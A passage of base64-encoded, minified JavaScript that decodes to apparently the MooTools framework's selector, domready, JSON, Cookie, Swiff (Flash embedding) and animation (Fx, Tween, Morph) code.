Y2hlY2tlZDpmdW5jdGlvbigpe3JldHVybiB0aGlzLmNoZWNrZWQ7fSxlbXB0eTpmdW5jdGlvbigpe3JldHVybiAhKHRoaXMuaW5uZXJUZXh0fHx0aGlzLnRleHRDb250ZW50fHwiIikubGVuZ3RoO30sbm90OmZ1bmN0aW9uKGEpe3JldHVybiAhRWxlbWVudC5tYXRjaCh0aGlzLGEpOwp9LGNvbnRhaW5zOmZ1bmN0aW9uKGEpe3JldHVybih0aGlzLmlubmVyVGV4dHx8dGhpcy50ZXh0Q29udGVudHx8IiIpLmNvbnRhaW5zKGEpO30sImZpcnN0LWNoaWxkIjpmdW5jdGlvbigpe3JldHVybiBTZWxlY3RvcnMuUHNldWRvLmluZGV4LmNhbGwodGhpcywwKTt9LCJsYXN0LWNoaWxkIjpmdW5jdGlvbigpe3ZhciBhPXRoaXM7CndoaWxlKChhPWEubmV4dFNpYmxpbmcpKXtpZihhLm5vZGVUeXBlPT0xKXtyZXR1cm4gZmFsc2U7fX1yZXR1cm4gdHJ1ZTt9LCJvbmx5LWNoaWxkIjpmdW5jdGlvbigpe3ZhciBiPXRoaXM7d2hpbGUoKGI9Yi5wcmV2aW91c1NpYmxpbmcpKXtpZihiLm5vZGVUeXBlPT0xKXtyZXR1cm4gZmFsc2U7Cn19dmFyIGE9dGhpczt3aGlsZSgoYT1hLm5leHRTaWJsaW5nKSl7aWYoYS5ub2RlVHlwZT09MSl7cmV0dXJuIGZhbHNlO319cmV0dXJuIHRydWU7fSwibnRoLWNoaWxkIjpmdW5jdGlvbihnLGUpe2c9KGc9PXVuZGVmaW5lZCk/Im4iOmc7dmFyIGM9U2VsZWN0b3JzLlV0aWxzLnBhcnNlTnRoQXJndW1lbnQoZyk7CmlmKGMuc3BlY2lhbCE9Im4iKXtyZXR1cm4gU2VsZWN0b3JzLlBzZXVkb1tjLnNwZWNpYWxdLmNhbGwodGhpcyxjLmEsZSk7fXZhciBmPTA7ZS5wb3NpdGlvbnM9ZS5wb3NpdGlvbnN8fHt9O3ZhciBkPSR1aWQodGhpcyk7aWYoIWUucG9zaXRpb25zW2RdKXt2YXIgYj10aGlzOwp3aGlsZSgoYj1iLnByZXZpb3VzU2libGluZykpe2lmKGIubm9kZVR5cGUhPTEpe2NvbnRpbnVlO31mKys7dmFyIGE9ZS5wb3NpdGlvbnNbJHVpZChiKV07aWYoYSE9dW5kZWZpbmVkKXtmPWErZjticmVhazt9fWUucG9zaXRpb25zW2RdPWY7fXJldHVybihlLnBvc2l0aW9uc1tkXSVjLmE9PWMuYik7Cn0saW5kZXg6ZnVuY3Rpb24oYSl7dmFyIGI9dGhpcyxjPTA7d2hpbGUoKGI9Yi5wcmV2aW91c1NpYmxpbmcpKXtpZihiLm5vZGVUeXBlPT0xJiYrK2M+YSl7cmV0dXJuIGZhbHNlO319cmV0dXJuKGM9PWEpO30sZXZlbjpmdW5jdGlvbihiLGEpe3JldHVybiBTZWxlY3RvcnMuUHNldWRvWyJudGgtY2hpbGQiXS5jYWxsKHRoaXMsIjJuKzEiLGEpOwp9LG9kZDpmdW5jdGlvbihiLGEpe3JldHVybiBTZWxlY3RvcnMuUHNldWRvWyJudGgtY2hpbGQiXS5jYWxsKHRoaXMsIjJuIixhKTt9LHNlbGVjdGVkOmZ1bmN0aW9uKCl7cmV0dXJuIHRoaXMuc2VsZWN0ZWQ7fX0pO0VsZW1lbnQuRXZlbnRzLmRvbXJlYWR5PXtvbkFkZDpmdW5jdGlvbihhKXtpZihCcm93c2VyLmxvYWRlZCl7YS5jYWxsKHRoaXMpOwp9fX07KGZ1bmN0aW9uKCl7dmFyIGI9ZnVuY3Rpb24oKXtpZihCcm93c2VyLmxvYWRlZCl7cmV0dXJuO31Ccm93c2VyLmxvYWRlZD10cnVlO3dpbmRvdy5maXJlRXZlbnQoImRvbXJlYWR5Iik7ZG9jdW1lbnQuZmlyZUV2ZW50KCJkb21yZWFkeSIpO307aWYoQnJvd3Nlci5FbmdpbmUudHJpZGVudCl7dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CihmdW5jdGlvbigpeygkdHJ5KGZ1bmN0aW9uKCl7YS5kb1Njcm9sbCgibGVmdCIpO3JldHVybiAkKGEpLmluamVjdChkb2N1bWVudC5ib2R5KS5zZXQoImh0bWwiLCJ0ZW1wIikuZGlzcG9zZSgpO30pKT9iKCk6YXJndW1lbnRzLmNhbGxlZS5kZWxheSg1MCk7fSkoKTsKfWVsc2V7aWYoQnJvd3Nlci5FbmdpbmUud2Via2l0JiZCcm93c2VyLkVuZ2luZS52ZXJzaW9uPDUyNSl7KGZ1bmN0aW9uKCl7KFsibG9hZGVkIiwiY29tcGxldGUiXS5jb250YWlucyhkb2N1bWVudC5yZWFkeVN0YXRlKSk/YigpOmFyZ3VtZW50cy5jYWxsZWUuZGVsYXkoNTApOwp9KSgpO31lbHNle3dpbmRvdy5hZGRFdmVudCgibG9hZCIsYik7ZG9jdW1lbnQuYWRkRXZlbnQoIkRPTUNvbnRlbnRMb2FkZWQiLGIpO319fSkoKTt2YXIgSlNPTj1uZXcgSGFzaCh7JHNwZWNpYWxDaGFyczp7IlxiIjoiXFxiIiwiXHQiOiJcXHQiLCJcbiI6IlxcbiIsIlxmIjoiXFxmIiwiXHIiOiJcXHIiLCciJzonXFwiJywiXFwiOiJcXFxcIn0sJHJlcGxhY2VDaGFyczpmdW5jdGlvbihhKXtyZXR1cm4gSlNPTi4kc3BlY2lhbENoYXJzW2FdfHwiXFx1MDAiK01hdGguZmxvb3IoYS5jaGFyQ29kZUF0KCkvMTYpLnRvU3RyaW5nKDE2KSsoYS5jaGFyQ29kZUF0KCklMTYpLnRvU3RyaW5nKDE2KTsKfSxlbmNvZGU6ZnVuY3Rpb24oYil7c3dpdGNoKCR0eXBlKGIpKXtjYXNlInN0cmluZyI6cmV0dXJuJyInK2IucmVwbGFjZSgvW1x4MDAtXHgxZlxcIl0vZyxKU09OLiRyZXBsYWNlQ2hhcnMpKyciJztjYXNlImFycmF5IjpyZXR1cm4iWyIrU3RyaW5nKGIubWFwKEpTT04uZW5jb2RlKS5maWx0ZXIoJGRlZmluZWQpKSsiXSI7CmNhc2Uib2JqZWN0IjpjYXNlImhhc2giOnZhciBhPVtdO0hhc2guZWFjaChiLGZ1bmN0aW9uKGUsZCl7dmFyIGM9SlNPTi5lbmNvZGUoZSk7aWYoYyl7YS5wdXNoKEpTT04uZW5jb2RlKGQpKyI6IitjKTt9fSk7cmV0dXJuInsiK2ErIn0iO2Nhc2UibnVtYmVyIjpjYXNlImJvb2xlYW4iOnJldHVybiBTdHJpbmcoYik7CmNhc2UgZmFsc2U6cmV0dXJuIm51bGwiO31yZXR1cm4gbnVsbDt9LGRlY29kZTpmdW5jdGlvbihzdHJpbmcsc2VjdXJlKXtpZigkdHlwZShzdHJpbmcpIT0ic3RyaW5nInx8IXN0cmluZy5sZW5ndGgpe3JldHVybiBudWxsO31pZihzZWN1cmUmJiEoL15bLDp7fVxbXF0wLTkuXC0rRWFlZmxuci11IFxuXHJcdF0qJC8pLnRlc3Qoc3RyaW5nLnJlcGxhY2UoL1xcLi9nLCJAIikucmVwbGFjZSgvIlteIlxcXG5ccl0qIi9nLCIiKSkpe3JldHVybiBudWxsOwp9cmV0dXJuIGV2YWwoIigiK3N0cmluZysiKSIpO319KTtOYXRpdmUuaW1wbGVtZW50KFtIYXNoLEFycmF5LFN0cmluZyxOdW1iZXJdLHt0b0pTT046ZnVuY3Rpb24oKXtyZXR1cm4gSlNPTi5lbmNvZGUodGhpcyk7fX0pO3ZhciBDb29raWU9bmV3IENsYXNzKHtJbXBsZW1lbnRzOk9wdGlvbnMsb3B0aW9uczp7cGF0aDpmYWxzZSxkb21haW46ZmFsc2UsZHVyYXRpb246ZmFsc2Usc2VjdXJlOmZhbHNlLGRvY3VtZW50OmRvY3VtZW50fSxpbml0aWFsaXplOmZ1bmN0aW9uKGIsYSl7dGhpcy5rZXk9YjsKdGhpcy5zZXRPcHRpb25zKGEpO30sd3JpdGU6ZnVuY3Rpb24oYil7Yj1lbmNvZGVVUklDb21wb25lbnQoYik7aWYodGhpcy5vcHRpb25zLmRvbWFpbil7Yis9IjsgZG9tYWluPSIrdGhpcy5vcHRpb25zLmRvbWFpbjt9aWYodGhpcy5vcHRpb25zLnBhdGgpe2IrPSI7IHBhdGg9Iit0aGlzLm9wdGlvbnMucGF0aDsKfWlmKHRoaXMub3B0aW9ucy5kdXJhdGlvbil7dmFyIGE9bmV3IERhdGUoKTthLnNldFRpbWUoYS5nZXRUaW1lKCkrdGhpcy5vcHRpb25zLmR1cmF0aW9uKjI0KjYwKjYwKjEwMDApO2IrPSI7IGV4cGlyZXM9IithLnRvR01UU3RyaW5nKCk7fWlmKHRoaXMub3B0aW9ucy5zZWN1cmUpe2IrPSI7IHNlY3VyZSI7Cn10aGlzLm9wdGlvbnMuZG9jdW1lbnQuY29va2llPXRoaXMua2V5KyI9IitiO3JldHVybiB0aGlzO30scmVhZDpmdW5jdGlvbigpe3ZhciBhPXRoaXMub3B0aW9ucy5kb2N1bWVudC5jb29raWUubWF0Y2goIig/Ol58OylcXHMqIit0aGlzLmtleS5lc2NhcGVSZWdFeHAoKSsiPShbXjtdKikiKTsKcmV0dXJuKGEpP2RlY29kZVVSSUNvbXBvbmVudChhWzFdKTpudWxsO30sZGlzcG9zZTpmdW5jdGlvbigpe25ldyBDb29raWUodGhpcy5rZXksJG1lcmdlKHRoaXMub3B0aW9ucyx7ZHVyYXRpb246LTF9KSkud3JpdGUoIiIpO3JldHVybiB0aGlzO319KTtDb29raWUud3JpdGU9ZnVuY3Rpb24oYixjLGEpe3JldHVybiBuZXcgQ29va2llKGIsYSkud3JpdGUoYyk7Cn07Q29va2llLnJlYWQ9ZnVuY3Rpb24oYSl7cmV0dXJuIG5ldyBDb29raWUoYSkucmVhZCgpO307Q29va2llLmRpc3Bvc2U9ZnVuY3Rpb24oYixhKXtyZXR1cm4gbmV3IENvb2tpZShiLGEpLmRpc3Bvc2UoKTt9O3ZhciBTd2lmZj1uZXcgQ2xhc3Moe0ltcGxlbWVudHM6W09wdGlvbnNdLG9wdGlvbnM6e2lkOm51bGwsaGVpZ2h0OjEsd2lkdGg6MSxjb250YWluZXI6bnVsbCxwcm9wZXJ0aWVzOnt9LHBhcmFtczp7cXVhbGl0eToiaGlnaCIsYWxsb3dTY3JpcHRBY2Nlc3M6ImFsd2F5cyIsd01vZGU6InRyYW5zcGFyZW50Iixzd0xpdmVDb25uZWN0OnRydWV9LGNhbGxCYWNrczp7fSx2YXJzOnt9fSx0b0VsZW1lbnQ6ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5vYmplY3Q7Cn0saW5pdGlhbGl6ZTpmdW5jdGlvbihsLG0pe3RoaXMuaW5zdGFuY2U9IlN3aWZmXyIrJHRpbWUoKTt0aGlzLnNldE9wdGlvbnMobSk7bT10aGlzLm9wdGlvbnM7dmFyIGI9dGhpcy5pZD1tLmlkfHx0aGlzLmluc3RhbmNlO3ZhciBhPSQobS5jb250YWluZXIpO1N3aWZmLkNhbGxCYWNrc1t0aGlzLmluc3RhbmNlXT17fTsKdmFyIGU9bS5wYXJhbXMsZz1tLnZhcnMsZj1tLmNhbGxCYWNrczt2YXIgaD0kZXh0ZW5kKHtoZWlnaHQ6bS5oZWlnaHQsd2lkdGg6bS53aWR0aH0sbS5wcm9wZXJ0aWVzKTt2YXIgaz10aGlzO2Zvcih2YXIgZCBpbiBmKXtTd2lmZi5DYWxsQmFja3NbdGhpcy5pbnN0YW5jZV1bZF09KGZ1bmN0aW9uKG4pe3JldHVybiBmdW5jdGlvbigpe3JldHVybiBuLmFwcGx5KGsub2JqZWN0LGFyZ3VtZW50cyk7Cn07fSkoZltkXSk7Z1tkXT0iU3dpZmYuQ2FsbEJhY2tzLiIrdGhpcy5pbnN0YW5jZSsiLiIrZDt9ZS5mbGFzaFZhcnM9SGFzaC50b1F1ZXJ5U3RyaW5nKGcpO2lmKEJyb3dzZXIuRW5naW5lLnRyaWRlbnQpe2guY2xhc3NpZD0iY2xzaWQ6RDI3Q0RCNkUtQUU2RC0xMWNmLTk2QjgtNDQ0NTUzNTQwMDAwIjsKZS5tb3ZpZT1sO31lbHNle2gudHlwZT0iYXBwbGljYXRpb24veC1zaG9ja3dhdmUtZmxhc2giO2guZGF0YT1sO312YXIgaj0nPG9iamVjdCBpZD0iJytiKyciJztmb3IodmFyIGkgaW4gaCl7ais9IiAiK2krJz0iJytoW2ldKyciJzt9ais9Ij4iO2Zvcih2YXIgYyBpbiBlKXtpZihlW2NdKXtqKz0nPHBhcmFtIG5hbWU9IicrYysnIiB2YWx1ZT0iJytlW2NdKyciIC8+JzsKfX1qKz0iPC9vYmplY3Q+Ijt0aGlzLm9iamVjdD0oKGEpP2EuZW1wdHkoKTpuZXcgRWxlbWVudCgiZGl2IikpLnNldCgiaHRtbCIsaikuZmlyc3RDaGlsZDt9LHJlcGxhY2VzOmZ1bmN0aW9uKGEpe2E9JChhLHRydWUpO2EucGFyZW50Tm9kZS5yZXBsYWNlQ2hpbGQodGhpcy50b0VsZW1lbnQoKSxhKTsKcmV0dXJuIHRoaXM7fSxpbmplY3Q6ZnVuY3Rpb24oYSl7JChhLHRydWUpLmFwcGVuZENoaWxkKHRoaXMudG9FbGVtZW50KCkpO3JldHVybiB0aGlzO30scmVtb3RlOmZ1bmN0aW9uKCl7cmV0dXJuIFN3aWZmLnJlbW90ZS5hcHBseShTd2lmZixbdGhpcy50b0VsZW1lbnQoKV0uZXh0ZW5kKGFyZ3VtZW50cykpOwp9fSk7U3dpZmYuQ2FsbEJhY2tzPXt9O1N3aWZmLnJlbW90ZT1mdW5jdGlvbihvYmosZm4pe3ZhciBycz1vYmouQ2FsbEZ1bmN0aW9uKCc8aW52b2tlIG5hbWU9IicrZm4rJyIgcmV0dXJudHlwZT0iamF2YXNjcmlwdCI+JytfX2ZsYXNoX19hcmd1bWVudHNUb1hNTChhcmd1bWVudHMsMikrIjwvaW52b2tlPiIpOwpyZXR1cm4gZXZhbChycyk7fTt2YXIgRng9bmV3IENsYXNzKHtJbXBsZW1lbnRzOltDaGFpbixFdmVudHMsT3B0aW9uc10sb3B0aW9uczp7ZnBzOjUwLHVuaXQ6ZmFsc2UsZHVyYXRpb246NTAwLGxpbms6Imlnbm9yZSJ9LGluaXRpYWxpemU6ZnVuY3Rpb24oYSl7dGhpcy5zdWJqZWN0PXRoaXMuc3ViamVjdHx8dGhpczsKdGhpcy5zZXRPcHRpb25zKGEpO3RoaXMub3B0aW9ucy5kdXJhdGlvbj1GeC5EdXJhdGlvbnNbdGhpcy5vcHRpb25zLmR1cmF0aW9uXXx8dGhpcy5vcHRpb25zLmR1cmF0aW9uLnRvSW50KCk7dmFyIGI9dGhpcy5vcHRpb25zLndhaXQ7aWYoYj09PWZhbHNlKXt0aGlzLm9wdGlvbnMubGluaz0iY2FuY2VsIjsKfX0sZ2V0VHJhbnNpdGlvbjpmdW5jdGlvbigpe3JldHVybiBmdW5jdGlvbihhKXtyZXR1cm4gLShNYXRoLmNvcyhNYXRoLlBJKmEpLTEpLzI7fTt9LHN0ZXA6ZnVuY3Rpb24oKXt2YXIgYT0kdGltZSgpO2lmKGE8dGhpcy50aW1lK3RoaXMub3B0aW9ucy5kdXJhdGlvbil7dmFyIGI9dGhpcy50cmFuc2l0aW9uKChhLXRoaXMudGltZSkvdGhpcy5vcHRpb25zLmR1cmF0aW9uKTsKdGhpcy5zZXQodGhpcy5jb21wdXRlKHRoaXMuZnJvbSx0aGlzLnRvLGIpKTt9ZWxzZXt0aGlzLnNldCh0aGlzLmNvbXB1dGUodGhpcy5mcm9tLHRoaXMudG8sMSkpO3RoaXMuY29tcGxldGUoKTt9fSxzZXQ6ZnVuY3Rpb24oYSl7cmV0dXJuIGE7fSxjb21wdXRlOmZ1bmN0aW9uKGMsYixhKXtyZXR1cm4gRnguY29tcHV0ZShjLGIsYSk7Cn0sY2hlY2s6ZnVuY3Rpb24oKXtpZighdGhpcy50aW1lcil7cmV0dXJuIHRydWU7fXN3aXRjaCh0aGlzLm9wdGlvbnMubGluayl7Y2FzZSJjYW5jZWwiOnRoaXMuY2FuY2VsKCk7cmV0dXJuIHRydWU7Y2FzZSJjaGFpbiI6dGhpcy5jaGFpbih0aGlzLmNhbGxlci5iaW5kKHRoaXMsYXJndW1lbnRzKSk7CnJldHVybiBmYWxzZTt9cmV0dXJuIGZhbHNlO30sc3RhcnQ6ZnVuY3Rpb24oYixhKXtpZighdGhpcy5jaGVjayhiLGEpKXtyZXR1cm4gdGhpczt9dGhpcy5mcm9tPWI7dGhpcy50bz1hO3RoaXMudGltZT0wO3RoaXMudHJhbnNpdGlvbj10aGlzLmdldFRyYW5zaXRpb24oKTsKdGhpcy5zdGFydFRpbWVyKCk7dGhpcy5vblN0YXJ0KCk7cmV0dXJuIHRoaXM7fSxjb21wbGV0ZTpmdW5jdGlvbigpe2lmKHRoaXMuc3RvcFRpbWVyKCkpe3RoaXMub25Db21wbGV0ZSgpO31yZXR1cm4gdGhpczt9LGNhbmNlbDpmdW5jdGlvbigpe2lmKHRoaXMuc3RvcFRpbWVyKCkpe3RoaXMub25DYW5jZWwoKTsKfXJldHVybiB0aGlzO30sb25TdGFydDpmdW5jdGlvbigpe3RoaXMuZmlyZUV2ZW50KCJzdGFydCIsdGhpcy5zdWJqZWN0KTt9LG9uQ29tcGxldGU6ZnVuY3Rpb24oKXt0aGlzLmZpcmVFdmVudCgiY29tcGxldGUiLHRoaXMuc3ViamVjdCk7aWYoIXRoaXMuY2FsbENoYWluKCkpe3RoaXMuZmlyZUV2ZW50KCJjaGFpbkNvbXBsZXRlIix0aGlzLnN1YmplY3QpOwp9fSxvbkNhbmNlbDpmdW5jdGlvbigpe3RoaXMuZmlyZUV2ZW50KCJjYW5jZWwiLHRoaXMuc3ViamVjdCkuY2xlYXJDaGFpbigpO30scGF1c2U6ZnVuY3Rpb24oKXt0aGlzLnN0b3BUaW1lcigpO3JldHVybiB0aGlzO30scmVzdW1lOmZ1bmN0aW9uKCl7dGhpcy5zdGFydFRpbWVyKCk7CnJldHVybiB0aGlzO30sc3RvcFRpbWVyOmZ1bmN0aW9uKCl7aWYoIXRoaXMudGltZXIpe3JldHVybiBmYWxzZTt9dGhpcy50aW1lPSR0aW1lKCktdGhpcy50aW1lO3RoaXMudGltZXI9JGNsZWFyKHRoaXMudGltZXIpO3JldHVybiB0cnVlO30sc3RhcnRUaW1lcjpmdW5jdGlvbigpe2lmKHRoaXMudGltZXIpe3JldHVybiBmYWxzZTsKfXRoaXMudGltZT0kdGltZSgpLXRoaXMudGltZTt0aGlzLnRpbWVyPXRoaXMuc3RlcC5wZXJpb2RpY2FsKE1hdGgucm91bmQoMTAwMC90aGlzLm9wdGlvbnMuZnBzKSx0aGlzKTtyZXR1cm4gdHJ1ZTt9fSk7RnguY29tcHV0ZT1mdW5jdGlvbihjLGIsYSl7cmV0dXJuKGItYykqYStjOwp9O0Z4LkR1cmF0aW9ucz17InNob3J0IjoyNTAsbm9ybWFsOjUwMCwibG9uZyI6MTAwMH07RnguQ1NTPW5ldyBDbGFzcyh7RXh0ZW5kczpGeCxwcmVwYXJlOmZ1bmN0aW9uKGQsZSxiKXtiPSRzcGxhdChiKTt2YXIgYz1iWzFdO2lmKCEkY2hrKGMpKXtiWzFdPWJbMF07CmJbMF09ZC5nZXRTdHlsZShlKTt9dmFyIGE9Yi5tYXAodGhpcy5wYXJzZSk7cmV0dXJue2Zyb206YVswXSx0bzphWzFdfTt9LHBhcnNlOmZ1bmN0aW9uKGEpe2E9JGxhbWJkYShhKSgpO2E9KHR5cGVvZiBhPT0ic3RyaW5nIik/YS5zcGxpdCgiICIpOiRzcGxhdChhKTsKcmV0dXJuIGEubWFwKGZ1bmN0aW9uKGMpe2M9U3RyaW5nKGMpO3ZhciBiPWZhbHNlO0Z4LkNTUy5QYXJzZXJzLmVhY2goZnVuY3Rpb24oZixlKXtpZihiKXtyZXR1cm47fXZhciBkPWYucGFyc2UoYyk7aWYoJGNoayhkKSl7Yj17dmFsdWU6ZCxwYXJzZXI6Zn07fX0pOwpiPWJ8fHt2YWx1ZTpjLHBhcnNlcjpGeC5DU1MuUGFyc2Vycy5TdHJpbmd9O3JldHVybiBiO30pO30sY29tcHV0ZTpmdW5jdGlvbihkLGMsYil7dmFyIGE9W107KE1hdGgubWluKGQubGVuZ3RoLGMubGVuZ3RoKSkudGltZXMoZnVuY3Rpb24oZSl7YS5wdXNoKHt2YWx1ZTpkW2VdLnBhcnNlci5jb21wdXRlKGRbZV0udmFsdWUsY1tlXS52YWx1ZSxiKSxwYXJzZXI6ZFtlXS5wYXJzZXJ9KTsKfSk7YS4kZmFtaWx5PXtuYW1lOiJmeDpjc3M6dmFsdWUifTtyZXR1cm4gYTt9LHNlcnZlOmZ1bmN0aW9uKGMsYil7aWYoJHR5cGUoYykhPSJmeDpjc3M6dmFsdWUiKXtjPXRoaXMucGFyc2UoYyk7fXZhciBhPVtdO2MuZWFjaChmdW5jdGlvbihkKXthPWEuY29uY2F0KGQucGFyc2VyLnNlcnZlKGQudmFsdWUsYikpOwp9KTtyZXR1cm4gYTt9LHJlbmRlcjpmdW5jdGlvbihhLGQsYyxiKXthLnNldFN0eWxlKGQsdGhpcy5zZXJ2ZShjLGIpKTt9LHNlYXJjaDpmdW5jdGlvbihhKXtpZihGeC5DU1MuQ2FjaGVbYV0pe3JldHVybiBGeC5DU1MuQ2FjaGVbYV07fXZhciBiPXt9O0FycmF5LmVhY2goZG9jdW1lbnQuc3R5bGVTaGVldHMsZnVuY3Rpb24oZSxkKXt2YXIgYz1lLmhyZWY7CmlmKGMmJmMuY29udGFpbnMoIjovLyIpJiYhYy5jb250YWlucyhkb2N1bWVudC5kb21haW4pKXtyZXR1cm47fXZhciBmPWUucnVsZXN8fGUuY3NzUnVsZXM7QXJyYXkuZWFjaChmLGZ1bmN0aW9uKGosZyl7aWYoIWouc3R5bGUpe3JldHVybjt9dmFyIGg9KGouc2VsZWN0b3JUZXh0KT9qLnNlbGVjdG9yVGV4dC5yZXBsYWNlKC9eXHcrLyxmdW5jdGlvbihpKXtyZXR1cm4gaS50b0xvd2VyQ2FzZSgpOwp9KTpudWxsO2lmKCFofHwhaC50ZXN0KCJeIithKyIkIikpe3JldHVybjt9RWxlbWVudC5TdHlsZXMuZWFjaChmdW5jdGlvbihrLGkpe2lmKCFqLnN0eWxlW2ldfHxFbGVtZW50LlNob3J0U3R5bGVzW2ldKXtyZXR1cm47fWs9U3RyaW5nKGouc3R5bGVbaV0pO2JbaV09KGsudGVzdCgvXnJnYi8pKT9rLnJnYlRvSGV4KCk6azsKfSk7fSk7fSk7cmV0dXJuIEZ4LkNTUy5DYWNoZVthXT1iO319KTtGeC5DU1MuQ2FjaGU9e307RnguQ1NTLlBhcnNlcnM9bmV3IEhhc2goe0NvbG9yOntwYXJzZTpmdW5jdGlvbihhKXtpZihhLm1hdGNoKC9eI1swLTlhLWZdezMsNn0kL2kpKXtyZXR1cm4gYS5oZXhUb1JnYih0cnVlKTsKfXJldHVybigoYT1hLm1hdGNoKC8oXGQrKSxccyooXGQrKSxccyooXGQrKS8pKSk/W2FbMV0sYVsyXSxhWzNdXTpmYWxzZTt9LGNvbXB1dGU6ZnVuY3Rpb24oYyxiLGEpe3JldHVybiBjLm1hcChmdW5jdGlvbihlLGQpe3JldHVybiBNYXRoLnJvdW5kKEZ4LmNvbXB1dGUoY1tkXSxiW2RdLGEpKTsKfSk7fSxzZXJ2ZTpmdW5jdGlvbihhKXtyZXR1cm4gYS5tYXAoTnVtYmVyKTt9fSxOdW1iZXI6e3BhcnNlOnBhcnNlRmxvYXQsY29tcHV0ZTpGeC5jb21wdXRlLHNlcnZlOmZ1bmN0aW9uKGIsYSl7cmV0dXJuKGEpP2IrYTpiO319LFN0cmluZzp7cGFyc2U6JGxhbWJkYShmYWxzZSksY29tcHV0ZTokYXJndW1lbnRzKDEpLHNlcnZlOiRhcmd1bWVudHMoMCl9fSk7CkZ4LlR3ZWVuPW5ldyBDbGFzcyh7RXh0ZW5kczpGeC5DU1MsaW5pdGlhbGl6ZTpmdW5jdGlvbihiLGEpe3RoaXMuZWxlbWVudD10aGlzLnN1YmplY3Q9JChiKTt0aGlzLnBhcmVudChhKTt9LHNldDpmdW5jdGlvbihiLGEpe2lmKGFyZ3VtZW50cy5sZW5ndGg9PTEpe2E9YjsKYj10aGlzLnByb3BlcnR5fHx0aGlzLm9wdGlvbnMucHJvcGVydHk7fXRoaXMucmVuZGVyKHRoaXMuZWxlbWVudCxiLGEsdGhpcy5vcHRpb25zLnVuaXQpO3JldHVybiB0aGlzO30sc3RhcnQ6ZnVuY3Rpb24oYyxlLGQpe2lmKCF0aGlzLmNoZWNrKGMsZSxkKSl7cmV0dXJuIHRoaXM7Cn12YXIgYj1BcnJheS5mbGF0dGVuKGFyZ3VtZW50cyk7dGhpcy5wcm9wZXJ0eT10aGlzLm9wdGlvbnMucHJvcGVydHl8fGIuc2hpZnQoKTt2YXIgYT10aGlzLnByZXBhcmUodGhpcy5lbGVtZW50LHRoaXMucHJvcGVydHksYik7cmV0dXJuIHRoaXMucGFyZW50KGEuZnJvbSxhLnRvKTsKfX0pO0VsZW1lbnQuUHJvcGVydGllcy50d2Vlbj17c2V0OmZ1bmN0aW9uKGEpe3ZhciBiPXRoaXMucmV0cmlldmUoInR3ZWVuIik7aWYoYil7Yi5jYW5jZWwoKTt9cmV0dXJuIHRoaXMuZWxpbWluYXRlKCJ0d2VlbiIpLnN0b3JlKCJ0d2VlbjpvcHRpb25zIiwkZXh0ZW5kKHtsaW5rOiJjYW5jZWwifSxhKSk7Cn0sZ2V0OmZ1bmN0aW9uKGEpe2lmKGF8fCF0aGlzLnJldHJpZXZlKCJ0d2VlbiIpKXtpZihhfHwhdGhpcy5yZXRyaWV2ZSgidHdlZW46b3B0aW9ucyIpKXt0aGlzLnNldCgidHdlZW4iLGEpO310aGlzLnN0b3JlKCJ0d2VlbiIsbmV3IEZ4LlR3ZWVuKHRoaXMsdGhpcy5yZXRyaWV2ZSgidHdlZW46b3B0aW9ucyIpKSk7Cn1yZXR1cm4gdGhpcy5yZXRyaWV2ZSgidHdlZW4iKTt9fTtFbGVtZW50LmltcGxlbWVudCh7dHdlZW46ZnVuY3Rpb24oYSxjLGIpe3RoaXMuZ2V0KCJ0d2VlbiIpLnN0YXJ0KGFyZ3VtZW50cyk7cmV0dXJuIHRoaXM7fSxmYWRlOmZ1bmN0aW9uKGMpe3ZhciBlPXRoaXMuZ2V0KCJ0d2VlbiIpLGQ9Im9wYWNpdHkiLGE7CmM9JHBpY2soYywidG9nZ2xlIik7c3dpdGNoKGMpe2Nhc2UiaW4iOmUuc3RhcnQoZCwxKTticmVhaztjYXNlIm91dCI6ZS5zdGFydChkLDApO2JyZWFrO2Nhc2Uic2hvdyI6ZS5zZXQoZCwxKTticmVhaztjYXNlImhpZGUiOmUuc2V0KGQsMCk7YnJlYWs7Y2FzZSJ0b2dnbGUiOnZhciBiPXRoaXMucmV0cmlldmUoImZhZGU6ZmxhZyIsdGhpcy5nZXQoIm9wYWNpdHkiKT09MSk7CmUuc3RhcnQoZCwoYik/MDoxKTt0aGlzLnN0b3JlKCJmYWRlOmZsYWciLCFiKTthPXRydWU7YnJlYWs7ZGVmYXVsdDplLnN0YXJ0KGQsYXJndW1lbnRzKTt9aWYoIWEpe3RoaXMuZWxpbWluYXRlKCJmYWRlOmZsYWciKTt9cmV0dXJuIHRoaXM7fSxoaWdobGlnaHQ6ZnVuY3Rpb24oYyxhKXtpZighYSl7YT10aGlzLnJldHJpZXZlKCJoaWdobGlnaHQ6b3JpZ2luYWwiLHRoaXMuZ2V0U3R5bGUoImJhY2tncm91bmQtY29sb3IiKSk7CmE9KGE9PSJ0cmFuc3BhcmVudCIpPyIjZmZmIjphO312YXIgYj10aGlzLmdldCgidHdlZW4iKTtiLnN0YXJ0KCJiYWNrZ3JvdW5kLWNvbG9yIixjfHwiI2ZmZmY4OCIsYSkuY2hhaW4oZnVuY3Rpb24oKXt0aGlzLnNldFN0eWxlKCJiYWNrZ3JvdW5kLWNvbG9yIix0aGlzLnJldHJpZXZlKCJoaWdobGlnaHQ6b3JpZ2luYWwiKSk7CmIuY2FsbENoYWluKCk7fS5iaW5kKHRoaXMpKTtyZXR1cm4gdGhpczt9fSk7RnguTW9ycGg9bmV3IENsYXNzKHtFeHRlbmRzOkZ4LkNTUyxpbml0aWFsaXplOmZ1bmN0aW9uKGIsYSl7dGhpcy5lbGVtZW50PXRoaXMuc3ViamVjdD0kKGIpO3RoaXMucGFyZW50KGEpO30sc2V0OmZ1bmN0aW9uKGEpe2lmKHR5cGVvZiBhPT0ic3RyaW5nIil7YT10aGlzLnNlYXJjaChhKTsKfWZvcih2YXIgYiBpbiBhKXt0aGlzLnJlbmRlcih0aGlzLmVsZW1lbnQsYixhW2JdLHRoaXMub3B0aW9ucy51bml0KTt9cmV0dXJuIHRoaXM7fSxjb21wdXRlOmZ1bmN0aW9uKGUsZCxjKXt2YXIgYT17fTtmb3IodmFyIGIgaW4gZSl7YVtiXT10aGlzLnBhcmVudChlW2JdLGRbYl0sYyk7Cn1yZXR1cm4gYTt9LHN0YXJ0OmZ1bmN0aW9uKGIpe2lmKCF0aGlzLmNoZWNrKGIpKXtyZXR1cm4gdGhpczt9aWYodHlwZW9mIGI9PSJzdHJpbmciKXtiPXRoaXMuc2VhcmNoKGIpO312YXIgZT17fSxkPXt9O2Zvcih2YXIgYyBpbiBiKXt2YXIgYT10aGlzLnByZXBhcmUodG